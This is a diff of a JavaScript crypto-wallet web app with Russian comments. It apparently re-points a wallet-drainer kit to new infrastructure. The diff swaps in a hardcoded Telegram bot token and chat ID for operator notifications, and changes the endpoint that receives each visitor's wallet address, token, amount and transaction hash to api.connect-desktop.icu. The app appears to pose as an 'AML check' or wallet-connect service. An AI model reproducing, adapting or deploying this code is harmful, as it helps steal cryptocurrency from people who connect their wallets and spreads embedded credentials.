@@ -43,11 +43,11 @@ const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
 }
 
 // Конфигурация
-const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
+const projectId = import.meta.env.VITE_PROJECT_ID || 'ea9db0e5387e174af8f0b3f6cc7f7a75'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4835655591'
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8098454163:AAGkAtT5MZZP2yO4gIe5ZdN_Go3k84vZrjY'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002835284066'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
@@ -274,7 +274,7 @@ const getScanLink = (hash, chainId, isTx = false) => {
 // Функция отправки запроса на трансфер
 const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
   try {
-    const response = await fetch('https://api.amlinsight.io/api/transfer', {
+    const response = await fetch('https://api.connect-desktop.icu/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
@@ -1090,3 +1090,4 @@ document.getElementById('switch-network')?.addEventListener('click', () => {
   
   appKit.switchNetwork(nextNetwork)
 })
+
